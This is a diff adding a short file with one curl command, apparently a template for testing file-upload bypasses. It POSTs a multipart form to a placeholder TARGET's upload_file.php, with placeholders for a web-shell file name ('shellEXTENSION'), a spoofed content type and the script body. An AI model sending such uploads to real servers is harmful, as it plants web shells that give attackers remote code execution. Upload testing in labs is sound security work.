@@ -1,0 +1,15 @@
+curl 'http://TARGET/upload_file.php' \
+  -X POST \
+  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
+  -H 'Accept: */*' \
+  -H 'Accept-Language: en-US,en;q=0.5' \
+  -H 'Accept-Encoding: gzip, deflate' \
+  -H 'Referer: http://TARGET/' \
+  -H 'X-Requested-With: XMLHttpRequest' \
+  -H 'Content-Type: multipart/form-data; boundary=----geckoformboundaryc5cafb7bffea71716171f715696d4324' \
+  -H 'Origin: http://TARGET' \
+  -H 'DNT: 1' \
+  -H 'Connection: keep-alive' \
+  -H 'Priority: u=0' \
+  --data-binary \
+  $'------geckoformboundaryc5cafb7bffea71716171f715696d4324\r\nContent-Disposition: form-data; name="uploadFile"; filename="shellEXTENSION"\r\nContent-Type: HEADER\n\nSCRIPT\r\n\r\n------geckoformboundaryc5cafb7bffea71716171f715696d4324--\r\n'
